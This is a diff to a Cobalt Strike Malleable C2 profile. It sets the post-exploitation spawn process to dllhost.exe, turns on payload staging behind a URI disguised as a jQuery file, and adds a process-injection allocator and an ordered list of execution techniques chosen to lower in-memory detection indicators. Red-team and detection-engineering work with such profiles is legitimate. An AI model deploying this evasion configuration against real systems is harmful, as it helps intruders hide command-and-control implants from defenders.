@@ -146,8 +146,12 @@ set amsi_disable "false";
 ##      - set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
 ##      - set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
 ##      - Note: svchost.exe may look weird as the parent process 
-set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
-set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+
+
+post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+}
 
 ################################################
 ## TCP Beacon
@@ -218,8 +222,8 @@ set dns_stager_subhost ".feeds.123456.";
 ##    - Add customize HTTP headers to the HTTP traffic of your campaign
 ##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)
 
-set host_stage "false"; # Do not use staging. Must use stagles payloads
-#set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
+#set host_stage "false"; # Do not use staging. Must use stagles payloads
+set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
 
 http-stager {  
     set uri_x86 "/jquery-3.3.1.slim.min.js";
@@ -334,8 +338,13 @@ stage {
 ##    - Modify the indicators to minimize in memory indicators
 #     - Refer to 
 ##       https://www.cobaltstrike.com/help-malleable-c2#processinject
+##       https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/
 
 process-inject {
+
+    # set remote memory allocation technique
+    set allocator "NtMapViewOfSection";
+
     # Minimium memory allocation size when injecting content
     set min_alloc "17500";
 
@@ -362,7 +371,24 @@ process-inject {
     # disable "RtlCreateUserThread";
     
     # Only code injection technique that doesn't appear to break anything when disabled
-    disable "SetThreadContext";
+    # disable "SetThreadContext";
+    
+    execute {
+
+        # The order is important. Each step will be attempted (if applicable) until successful
+
+        # self-injection
+        CreateThread "ntdll!RtlUserThreadStart+0x42";
+        CreateThread;
+
+        # Injection via suspened processes
+        # When you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
+        # SetThreadContext;
+        NtQueueApcThread-s;
+
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
 
 
